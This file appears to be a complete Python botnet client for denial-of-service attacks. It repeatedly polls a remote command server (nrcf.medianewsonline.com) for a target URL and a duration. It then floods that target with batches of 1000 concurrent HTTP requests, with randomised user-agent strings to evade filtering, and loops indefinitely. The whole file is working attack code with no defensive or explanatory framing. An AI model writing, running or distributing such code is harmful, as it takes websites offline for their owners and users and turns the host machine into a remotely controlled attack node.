import asyncio
import aiohttp
import time
import xml.etree.ElementTree as ET
import random
from fake_useragent import UserAgent

concurrent_requests = 1000
api_url = 'http://nrcf.medianewsonline.com/api/index.php'
ua = UserAgent()

async def get_instructions():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                if response.status == 200:
                    xml_data = await response.text()
                    if xml_data:
                        try:
                            root = ET.fromstring(xml_data)
                            return root.find('url').text, int(root.find('time').text)
                        except ET.ParseError:
                            return None, None
                return None, None
    except Exception:
        return None, None

async def send_request(session, semaphore, url):
    async with semaphore:
        try:
            headers = {
                "User-Agent": ua.random,
                "Accept": "/",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Referer": url,
            }
            async with session.get(url, headers=headers, timeout=10) as response:
                await response.text()
        except Exception:
            pass

async def send_requests_in_batch(url, duration):
    start_time = time.time()
    semaphore = asyncio.Semaphore(concurrent_requests)
    connector = aiohttp.TCPConnector(limit=0, ssl=False)

    async with aiohttp.ClientSession(connector=connector) as session:
        while time.time() - start_time < duration:
            tasks = [send_request(session, semaphore, url) for _ in range(concurrent_requests)]
            await asyncio.gather(*tasks)

async def main():
    while True:
        url, duration = await get_instructions()
        if url and duration:
            await send_requests_in_batch(url, duration)
        else:
            await asyncio.sleep(random.randint(5, 30))

if __name__ == "__main__":
    asyncio.run(main())
